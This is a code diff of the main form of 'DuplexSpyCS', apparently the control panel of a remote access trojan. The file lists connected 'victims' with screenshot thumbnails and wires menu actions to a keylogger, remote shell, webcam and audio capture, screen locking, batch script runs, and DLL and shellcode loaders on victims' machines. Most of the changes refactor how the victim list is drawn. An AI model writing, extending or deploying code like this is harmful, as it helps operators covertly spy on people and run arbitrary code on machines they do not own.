@@ -11,7 +11,11 @@ namespace DuplexSpyCS
 {
     public partial class frmMain : Form
     {
-        public clsTcpListener listener;
+        NewListView newListView1 = new NewListView();
+        ImageList ilRowHack = new ImageList();
+
+        private Dictionary<string, Bitmap> _screens = new();
+        private Dictionary<string, ListViewItem> _items = new();
 
         ColorStyleMode color_style = ColorStyleMode.LightMode;
 
@@ -42,7 +46,7 @@ namespace DuplexSpyCS
         private List<clsVictim> fnlsGetSelectedVictims()
         {
             List<clsVictim> lsVictim = new List<clsVictim>();
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
                 lsVictim.Add(GetVictim(item));
 
             return lsVictim;
@@ -57,7 +61,7 @@ namespace DuplexSpyCS
             List<clsVictim> lsVictim = new List<clsVictim>();
             Invoke(new Action(() =>
             {
-                foreach (ListViewItem item in listView1.Items)
+                foreach (ListViewItem item in newListView1.Items)
                     lsVictim.Add(GetVictim(item));
             }));
 
@@ -199,8 +203,8 @@ namespace DuplexSpyCS
 
                     Invoke(new Action(() =>
                     {
-                        if (listView1.Items.Count > 0)
-                            x = listView1.FindItemWithText(online_id, true, 0);
+                        if (newListView1.Items.Count > 0)
+                            x = newListView1.FindItemWithText(online_id, true, 0);
                     }));
 
                     if (x == null) //NEW VICTIM
@@ -223,7 +227,12 @@ namespace DuplexSpyCS
 
                         Invoke(new Action(() =>
                         {
-                            listView1.Items.Add(item);
+                            Image img = clsTools.Base64ToImage(cmd[10]);
+
+                            _items[v.ID] = item;
+                            _screens[v.ID] = new Bitmap(img);
+
+                            newListView1.Items.Add(item);
 
                             ListViewItem k = listView2.FindItemWithText(online_id);
                             if (k != null)
@@ -250,7 +259,7 @@ namespace DuplexSpyCS
 
                         Invoke(new Action(() =>
                         {
-                            width = listView1.Columns[0].Width;
+                            width = newListView1.Columns[0].Width;
                         }));
 
                         if (width > 256)
@@ -263,41 +272,8 @@ namespace DuplexSpyCS
                         Bitmap bmp = new Bitmap(img, new Size(255, 255));
                         string szGuid = Guid.NewGuid().ToString();
 
-                        Invoke(new Action(() =>
-                        {
-                            il_screen.ImageSize = new Size(width, width);
-
-                            if (il_screen.Images.ContainsKey(v.ID))
-                            {
-                                il_screen.Images.Add(szGuid, il_screen.Images[v.ID]);
-                                x.ImageKey = szGuid;
-                                il_screen.Images.RemoveByKey(v.ID);
-                            }
-
-                            il_screen.Images.Add(v.ID, bmp);
-
-                            x.ImageKey = v.ID;
-
-                            if (il_screen.Images.ContainsKey(szGuid))
-                                il_screen.Images.RemoveByKey(szGuid);
-                        }));
-
                         v.img_LastDesktop = bmp;
-
-                        /*
-                        List<ListViewItem> lsItem = new List<ListViewItem>();
-                        foreach (ListViewItem item in listView1.Items)
-                        {
-                            if (item.SubItems[1].Text == online_id)
-                                lsItem.Add(item);
-                        }
-
-                        if (lsItem.Count > 1)
-                        {
-                            for (int i = 1; i < lsItem.Count; i++)
-                                listView1.Items.Remove(lsItem[i]);
-                        }
-                        */
+                        Invoke(new Action(() => fnUpdateScreenshot(v.ID, bmp)));
                     }
                 }
 
@@ -1315,21 +1291,7 @@ namespace DuplexSpyCS
                     frmFunStuff f = clsTools.fnFindForm<frmFunStuff>(v);
                     if (f == null)
                         return;
-                    if (cmd[1] == "screen")
-                    {
-                        if (cmd[2] == "lock")
-                        {
-                            int code = int.Parse(cmd[3]);
-                            if (code == 0)
-                            {
-                                MessageBox.Show("Screen is unlocked", "Status", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                            }
-                            else
-                            {
-                                MessageBox.Show("Screen is locked", "Status", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                            }
-                        }
-                    }
+                    
                     if (cmd[1] == "wp")
                     {
                         if (cmd[2] == "set")
@@ -1342,6 +1304,10 @@ namespace DuplexSpyCS
                                 MessageBox.Show(msg, "Error - Wallpaper", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                 return;
                             }
+                            else if (code == 1)
+                            {
+                                MessageBox.Show("Save wallpaper successfully.");
+                            }
                         }
                         else if (cmd[2] == "get")
                         {
@@ -1352,16 +1318,14 @@ namespace DuplexSpyCS
                             if (code == 1)
                             {
                                 Image img = clsTools.Base64ToImage(szB64Img);
+
+                                frmFunStuff ff = clsTools.fnFindForm<frmFunStuff>(v);
+                                if (ff == null)
+                                    return;
+
                                 Invoke(new Action(() =>
                                 {
-                                    SaveFileDialog sfd = new SaveFileDialog();
-                                    sfd.InitialDirectory = v.dir_victim;
-                                    sfd.FileName = "wallpaper.jpg";
-                                    if (sfd.ShowDialog() == DialogResult.OK)
-                                    {
-                                        img.Save(sfd.FileName);
-                                        MessageBox.Show("Save wallpaper successfully:\n" + sfd.FileName, "Save file", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                                    }
+                                    ff.fnShowImage(img);
                                 }));
                             }
                             else
@@ -1480,9 +1444,14 @@ namespace DuplexSpyCS
             {
                 try
                 {
-                    ListViewItem item = listView1.FindItemWithText(v.ID);
+                    ListViewItem item = newListView1.FindItemWithText(v.ID);
                     if (item != null)
-                        item.Remove();
+                    {
+                        _items.Remove(v.ID);
+                        _screens.Remove(v.ID);
+
+                        newListView1.Items.Remove(item);
+                    }
                 }
                 catch (Exception ex)
                 {
@@ -1501,12 +1470,25 @@ namespace DuplexSpyCS
 
         }
 
+        public void fnUpdateScreenshot(string key, Bitmap bmp)
+        {
+            if (!_screens.ContainsKey(key)) return;
+
+            _screens[key]?.Dispose();
+            _screens[key] = new Bitmap(bmp);
+
+            newListView1.BeginInvoke(() =>
+            {
+                if (_items.TryGetValue(key, out var item))
+                {
+                    newListView1.Invalidate(item.Bounds);
+                }
+            });
+        }
+
         //Setup DuplexSpyCS Server
         void fnSetup()
         {
-            //listView1.OwnerDraw = true;
-            //ColorStyle(color_style, this);
-
             toolStripLabel1.Text = string.Empty; //Sent Bytes
             toolStripLabel2.Text = string.Empty; //Received Bytes
 
@@ -1548,17 +1530,151 @@ namespace DuplexSpyCS
 
             clsStore.sql_conn = m_sqlConn;
 
-            //todo: load listener
+            ilRowHack.ImageSize = new Size(1, 200);
 
-            //Display remote desktop
-            listView1.SmallImageList = il_screen; //Detail mode.
-            listView1.LargeImageList = il_screen; //LargeIcon mode.
-            listView1.Columns[0].Width = listView1.Font.Height;
-            screen_width = listView1.Columns[0].Width;
+            if (newListView1 == null)
+                newListView1 = new NewListView();
+
+            newListView1.SmallImageList = ilRowHack;
+            newListView1.LargeImageList = ilRowHack;
+
+            newListView1.OwnerDraw = true;
+            newListView1.FullRowSelect = true;
+            newListView1.HideSelection = false;
+            newListView1.View = View.Details;
+
+            newListView1.ContextMenuStrip = contextMenuStrip1;
+            newListView1.Columns.Add("Screen", Font.Height);
+            newListView1.Columns.Add("Online ID", 150);
+            newListView1.Columns.Add("Username", 150);
+            newListView1.Columns.Add("IPv4 Address", 150);
+            newListView1.Columns.Add("Is Admin", 80);
+            newListView1.Columns.Add("Operating System", 200);
+            newListView1.Columns.Add("Ping", 80);
+            newListView1.Columns.Add("CPU", 80);
+            newListView1.Columns.Add("Monitor", 80);
+            newListView1.Columns.Add("Webcam", 80);
+            newListView1.Columns.Add("Active Window", 200);
+
+            tabControl1.TabPages[0].Controls.Add(newListView1);
+            newListView1.BringToFront();
+            newListView1.Dock = DockStyle.Fill;
+
+            newListView1.DrawColumnHeader += (s, e) =>
+            {
+                e.DrawDefault = true;
+            };
+            newListView1.DrawItem += (s, e) =>
+            {
+                if (newListView1.View != View.LargeIcon)
+                    return;
+
+                e.DrawBackground();
+
+                string key = ((clsVictim)e.Item.Tag).ID;
+                Image img = _screens[key];
+
+                int iconSize = newListView1.LargeImageList.ImageSize.Width;
+                Rectangle imgRect = new Rectangle(
+                    e.Bounds.X + (e.Bounds.Width - iconSize) / 2,
+                    e.Bounds.Y + 5,
+                    iconSize,
+                    iconSize);
+
+                e.Graphics.DrawImage(img, imgRect);
+
+                Rectangle textRect = new Rectangle(
+                    e.Bounds.X + 4,
+                    e.Bounds.Bottom - 25,
+                    e.Bounds.Width - 8,
+                    20);
+
+                TextRenderer.DrawText(
+                    e.Graphics,
+                    e.Item.Text,
+                    newListView1.Font,
+                    textRect,
+                    newListView1.ForeColor,
+                    TextFormatFlags.HorizontalCenter | TextFormatFlags.EndEllipsis);
+
+                if ((e.State & ListViewItemStates.Selected) != 0)
+                    e.DrawFocusRectangle();
+            };
+            newListView1.DrawSubItem += (s, e) =>
+            {
+                if (newListView1.View != View.Details)
+                    return;
+
+                bool selected = e.Item.Selected;
+
+                using var bg = new SolidBrush(selected ? SystemColors.Highlight : e.SubItem.BackColor);
+                e.Graphics.FillRectangle(bg, e.Bounds);
+
+                if (e.ColumnIndex == 0)
+                {
+                    string key = ((clsVictim)e.Item.Tag).ID;
+
+                    if (_screens.TryGetValue(key, out var bmp) && bmp.Width > 1)
+                    {
+                        int colWidth = e.Bounds.Width;
+                        int rowHeight = e.Bounds.Height;
+
+                        int size = Math.Min(colWidth, rowHeight);
+
+                        if (size <= 0)
+                            size = 0;
+
+                        if (size >= 255)
+                            size = 255;
+
+                        int x = e.Bounds.X + (colWidth - size) / 2;
+                        int y = e.Bounds.Y + (rowHeight - size) / 2;
+
+                        e.Graphics.InterpolationMode =
+                            System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
+
+                        e.Graphics.DrawImage(bmp, new Rectangle(x, y, size, size));
+
+                        ilRowHack.ImageSize = new Size(size, size);
+                    }
+                    return;
+                }
+
+                TextRenderer.DrawText(
+                    e.Graphics,
+                    e.SubItem.Text,
+                    newListView1.Font,
+                    e.Bounds,
+                    selected ? SystemColors.HighlightText : e.SubItem.ForeColor,
+                    TextFormatFlags.Left | TextFormatFlags.VerticalCenter);
+            };
+
+            newListView1.ColumnWidthChanged += (s, e) => newListView1.Invalidate();
+
+            newListView1.Columns[0].Width = newListView1.Font.Height;
+            screen_width = newListView1.Columns[0].Width;
 
             DateTime now = DateTime.Now;
             clsStore.dtStartUp = now;
             clsStore.sql_conn.NewLogs(clsSqlConn.CSV.Server, clsSqlConn.MsgType.System, $"Setup finished at: {now.ToString("yyyy-MM-dd HH:mm:ss")}");
+        }
+
+        public class NewListView : ListView
+        {
+            public NewListView()
+            {
+                this.DoubleBuffered = true;
+                this.SetStyle(ControlStyles.OptimizedDoubleBuffer | ControlStyles.AllPaintingInWmPaint, true);
+                this.UpdateStyles();
+            }
+
+            protected override void OnNotifyMessage(Message m)
+            {
+                if (m.Msg == 0x14) // WM_ERASEBKGND
+                    return;
+
+                base.OnNotifyMessage(m);
+            }
         }
 
         private void frmMain_Load(object sender, EventArgs e)
@@ -1569,7 +1685,7 @@ namespace DuplexSpyCS
         //MANAGER
         private void toolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim victim = GetVictim(item);
                 frmManager f = clsTools.fnFindForm<frmManager>(victim);
@@ -1612,7 +1728,7 @@ namespace DuplexSpyCS
         //DESKTOP
         private void toolStripMenuItem3_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 if (item.SubItems[8].Text == "0")
                 {
@@ -1644,18 +1760,19 @@ namespace DuplexSpyCS
 
             Text = $"DuplexSpyCS v2.0.0 by ISSAC | " +
                 $"Port[{szPorts}] | " +
-                $"Online[{listView1.Items.Count}] - " +
+                $"Online[{newListView1.Items.Count}] - " +
                 $"Implant[{listView2.Items.Count}] - " +
-                $"Total[{(listView1.Items.Count + listView2.Items.Count)}] | " +
-                $"Selected({tabControl1.SelectedTab.Text}) [{(tabControl1.SelectedIndex == 0 ? listView1.SelectedItems.Count : listView2.SelectedItems.Count)}]";
+                $"Total[{(newListView1.Items.Count + listView2.Items.Count)}] | " +
+                $"Selected({tabControl1.SelectedTab.Text}) [{(tabControl1.SelectedIndex == 0 ? newListView1.SelectedItems.Count : listView2.SelectedItems.Count)}]";
         }
 
         private void listView1_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
         {
+            return;
             if (e.ColumnIndex != 0)
                 return;
 
-            int width = listView1.Columns[0].Width;
+            int width = newListView1.Columns[0].Width;
             if (width < 25)
             {
                 width = 25;
@@ -1671,34 +1788,39 @@ namespace DuplexSpyCS
         //VIEW - LARGE ICON
         private void toolStripMenuItem4_Click(object sender, EventArgs e)
         {
-            listView1.View = View.LargeIcon;
-            screen_BigWidth = 255;
-            il_screen.ImageSize = new Size(screen_BigWidth, screen_BigWidth);
-            listView1.Columns[0].Width = screen_BigWidth;
-            foreach (ListViewItem item in listView1.Items)
+            newListView1.BeginUpdate();
+
+            newListView1.View = View.LargeIcon;
+
+            int size = 250;
+
+            ilRowHack.ImageSize = new Size(size, size);
+            ilRowHack.ColorDepth = ColorDepth.Depth32Bit;
+
+            foreach (ListViewItem item in newListView1.Items)
                 item.Text = item.SubItems[1].Text + "@" + item.SubItems[3].Text;
 
-            listView1.Refresh();
+            newListView1.EndUpdate();
         }
 
         //VIEW - DETAIL
         private void toolStripMenuItem5_Click(object sender, EventArgs e)
         {
-            listView1.View = View.Details;
-            listView1.Columns[0].Width = screen_width;
+            newListView1.View = View.Details;
+            newListView1.Columns[0].Width = screen_width;
 
-            il_screen.ImageSize = new Size(screen_width, screen_width);
+            ilRowHack.ImageSize = new Size(screen_width, screen_width);
 
-            foreach (ListViewItem item in listView1.Items)
+            foreach (ListViewItem item in newListView1.Items)
                 item.Text = string.Empty;
 
-            listView1.Refresh();
+            newListView1.Refresh();
         }
 
         //WEBCAM
         private void toolStripMenuItem8_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 if (item.SubItems[9].Text != "0")
                 {
@@ -1726,7 +1848,7 @@ namespace DuplexSpyCS
         //INFORMATION
         private void toolStripMenuItem6_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
                 frmInfo f = clsTools.fnFindForm<frmInfo>(v);
@@ -1748,7 +1870,7 @@ namespace DuplexSpyCS
         //FUN STUFF
         private void toolStripMenuItem7_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim victim = GetVictim(item);
                 frmFunStuff f = clsTools.fnFindForm<frmFunStuff>(victim);
@@ -1789,7 +1911,7 @@ namespace DuplexSpyCS
         //KEY LOGGER
         private void toolStripMenuItem12_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim victim = GetVictim(item);
                 frmKeyLogger f = clsTools.fnFindForm<frmKeyLogger>(victim);
@@ -1811,7 +1933,7 @@ namespace DuplexSpyCS
         //CHAT
         private void toolStripMenuItem13_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
                 frmChat f = clsTools.fnFindForm<frmChat>(v);
@@ -1834,11 +1956,11 @@ namespace DuplexSpyCS
         //MULTI - DESKTOP
         private void toolStripMenuItem14_Click(object sender, EventArgs e)
         {
-            if (listView1.SelectedItems.Count == 0)
+            if (newListView1.SelectedItems.Count == 0)
                 return;
 
             List<clsVictim> list = new List<clsVictim>();
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
                 list.Add(GetVictim(item));
 
             frmMultiDesktop f = new frmMultiDesktop();
@@ -1853,11 +1975,11 @@ namespace DuplexSpyCS
         //MULTI - WEBCAM
         private void toolStripMenuItem15_Click(object sender, EventArgs e)
         {
-            if (listView1.SelectedItems.Count == 0)
+            if (newListView1.SelectedItems.Count == 0)
                 return;
 
             List<clsVictim> l_victim = new List<clsVictim>();
-            foreach (ListViewItem item in listView1.SelectedItems.Cast<ListViewItem>().Where(x => x.SubItems[9].Text != "0").ToArray())
+            foreach (ListViewItem item in newListView1.SelectedItems.Cast<ListViewItem>().Where(x => x.SubItems[9].Text != "0").ToArray())
                 l_victim.Add(GetVictim(item));
 
             if (l_victim.Count == 0)
@@ -1878,21 +2000,17 @@ namespace DuplexSpyCS
         //MULTI - LOCK SCREEN
         private void toolStripMenuItem17_Click(object sender, EventArgs e)
         {
-            List<clsVictim> l_victim = new List<clsVictim>();
-            if (l_victim.Count == 0)
+            List<clsVictim> lsVictim = newListView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
+            if (lsVictim.Count == 0)
                 return;
 
-            foreach (ListViewItem item in listView1.SelectedItems)
-                l_victim.Add(GetVictim(item));
-            frmMultiLockScreen f = new frmMultiLockScreen();
-            f.l_victim = l_victim;
-            f.Text = @$"LockScreen";
-
+            frmMultiLockScreen f = new frmMultiLockScreen(lsVictim);
             f.Show();
         }
 
         private void listView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
         {
+            return;
             using (SolidBrush brush = new SolidBrush(Color.Black))
             {
                 e.Graphics.FillRectangle(brush, e.Bounds);
@@ -1914,11 +2032,13 @@ namespace DuplexSpyCS
 
         private void listView1_DrawItem(object sender, DrawListViewItemEventArgs e)
         {
+            return;
             e.DrawDefault = true;
         }
 
         private void listView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
         {
+            return;
             Color backColor = e.ColumnIndex % 2 == 0 ? Color.LightYellow : Color.LightGreen;
 
             using (SolidBrush brush = new SolidBrush(backColor))
@@ -1932,7 +2052,7 @@ namespace DuplexSpyCS
         //REMOTE SHELL
         private void toolStripMenuItem20_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim victim = GetVictim(item);
                 frmShell f = clsTools.fnFindForm<frmShell>(victim);
@@ -1954,7 +2074,7 @@ namespace DuplexSpyCS
         //CLIENT CONFIG
         private void toolStripMenuItem11_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim victim = GetVictim(item);
                 frmClientConfig f = clsTools.fnFindForm<frmClientConfig>(victim);
@@ -1976,7 +2096,7 @@ namespace DuplexSpyCS
         //WMI
         private void toolStripMenuItem22_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
                 frmWMI f = clsTools.fnFindForm<frmWMI>(v);
@@ -1998,7 +2118,7 @@ namespace DuplexSpyCS
         //AUDIO
         private void toolStripMenuItem24_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim victim = GetVictim(item);
                 frmAudio f = clsTools.fnFindForm<frmAudio>(victim);
@@ -2020,22 +2140,18 @@ namespace DuplexSpyCS
         //MULTI - RUN BATCH SCRIPT
         private void toolStripMenuItem23_Click(object sender, EventArgs e)
         {
-            List<clsVictim> lsVictim = listView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
+            List<clsVictim> lsVictim = newListView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
             if (lsVictim.Count == 0)
                 return;
 
-            frmMultiRunScript f = new frmMultiRunScript();
-            f.lsVictim = lsVictim;
-            f.StartPosition = FormStartPosition.CenterScreen;
-            f.Text = "MultiRunScript";
-
+            frmMultiRunScript f = new frmMultiRunScript(lsVictim);
             f.Show();
         }
 
         //POWER
         private void toolStripMenuItem26_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
                 frmPower f = clsTools.fnFindForm<frmPower>(v);
@@ -2057,7 +2173,7 @@ namespace DuplexSpyCS
         //SYSTEM
         private void toolStripMenuItem25_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim victim = GetVictim(item);
                 frmSystem f = clsTools.fnFindForm<frmSystem>(victim);
@@ -2085,16 +2201,13 @@ namespace DuplexSpyCS
         //ABOUT
         private void toolStripButton4_Click(object sender, EventArgs e)
         {
-            frmAbout f = new frmAbout();
-            f.Text = "About";
-            f.StartPosition = FormStartPosition.CenterScreen;
-            f.Show();
+            new frmBoxHelper("Function\\About").Show();
         }
 
         //Reconnect
         private void toolStripMenuItem28_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
                 v.fnReconnect();
@@ -2103,7 +2216,7 @@ namespace DuplexSpyCS
         //Disconnect
         private void toolStripMenuItem29_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
                 v.fnDisconnect();
@@ -2113,7 +2226,7 @@ namespace DuplexSpyCS
         //Run Script
         private void toolStripMenuItem21_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim victim = GetVictim(item);
                 frmRunScript f = clsTools.fnFindForm<frmRunScript>(victim);
@@ -2135,7 +2248,7 @@ namespace DuplexSpyCS
         //Open folder
         private void toolStripMenuItem18_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
                 Process.Start("explorer.exe", $"\"{v.dir_victim}\"");
@@ -2144,19 +2257,19 @@ namespace DuplexSpyCS
 
         private void toolStripMenuItem19_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
-                if (item.BackColor == listView1.BackColor)
+                if (item.BackColor == newListView1.BackColor)
                     item.BackColor = Color.IndianRed;
                 else
-                    item.BackColor = listView1.BackColor;
+                    item.BackColor = newListView1.BackColor;
             }
         }
 
         //Highlight - yes
         private void toolStripMenuItem30_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
                 item.BackColor = Color.IndianRed;
             }
@@ -2164,24 +2277,20 @@ namespace DuplexSpyCS
         //Highlight - now
         private void toolStripMenuItem31_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in listView1.SelectedItems)
+            foreach (ListViewItem item in newListView1.SelectedItems)
             {
-                item.BackColor = listView1.BackColor;
+                item.BackColor = newListView1.BackColor;
             }
         }
 
+        //Multi-URL
         private void toolStripMenuItem32_Click(object sender, EventArgs e)
         {
-            List<clsVictim> lsVictim = new List<clsVictim>();
-            foreach (ListViewItem item in listView1.SelectedItems)
-                lsVictim.Add(GetVictim(item));
+            List<clsVictim> lsVictim = newListView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
+            if (lsVictim.Count == 0)
+                return;
 
-            frmMultiURL f = new frmMultiURL();
-            f.m_lsVictim = lsVictim;
-            f.frmMain = this;
-            f.Text = "MultiURL";
-            f.StartPosition = FormStartPosition.CenterScreen;
-
+            frmMultiURL f = new frmMultiURL(lsVictim);
             f.Show();
         }
 
@@ -2219,19 +2328,19 @@ namespace DuplexSpyCS
         //Copy - Online ID
         private void toolStripMenuItem38_Click(object sender, EventArgs e)
         {
-            string szText = string.Join(Environment.NewLine, listView1.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray());
+            string szText = string.Join(Environment.NewLine, newListView1.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray());
             Clipboard.SetText(szText);
         }
         //Copy - IP
         private void toolStripMenuItem39_Click(object sender, EventArgs e)
         {
-            string szText = string.Join(Environment.NewLine, listView1.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[3].Text).ToArray());
+            string szText = string.Join(Environment.NewLine, newListView1.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[3].Text).ToArray());
             Clipboard.SetText(szText);
         }
         //Copy - OS
         private void toolStripMenuItem41_Click(object sender, EventArgs e)
         {
-            string szText = string.Join(Environment.NewLine, listView1.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[5].Text).ToArray());
+            string szText = string.Join(Environment.NewLine, newListView1.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[5].Text).ToArray());
             Clipboard.SetText(szText);
         }
 
@@ -2279,7 +2388,7 @@ namespace DuplexSpyCS
 
         private void toolStripMenuItem44_Click(object sender, EventArgs e)
         {
-            List<clsVictim> ls = listView1.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
+            List<clsVictim> ls = newListView1.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
 
             foreach (var victim in ls)
             {
@@ -2295,7 +2404,7 @@ namespace DuplexSpyCS
 
         private void toolStripMenuItem45_Click(object sender, EventArgs e)
         {
-            List<clsVictim> ls = listView1.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
+            List<clsVictim> ls = newListView1.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
 
             foreach (var victim in ls)
             {
@@ -2313,7 +2422,7 @@ namespace DuplexSpyCS
 
         private void toolStripMenuItem46_Click(object sender, EventArgs e)
         {
-            List<clsVictim> lsVictim = listView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
+            List<clsVictim> lsVictim = newListView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
 
             frmDllLoader f = new frmDllLoader(lsVictim);
             f.Show();
@@ -2321,7 +2430,7 @@ namespace DuplexSpyCS
 
         private void toolStripMenuItem47_Click(object sender, EventArgs e)
         {
-            List<clsVictim> lsVictim = listView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
+            List<clsVictim> lsVictim = newListView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
 
             frmShellcodeLoader f = new frmShellcodeLoader(lsVictim);
             f.Show();
@@ -2334,10 +2443,11 @@ namespace DuplexSpyCS
 
         private void listView1_ColumnWidthChanged(object sender, ColumnWidthChangedEventArgs e)
         {
+            return;
             if (e.ColumnIndex != 0)
                 return;
 
-            int width = listView1.Columns[0].Width;
+            int width = newListView1.Columns[0].Width;
             if (width < 25)
             {
                 width = 25;
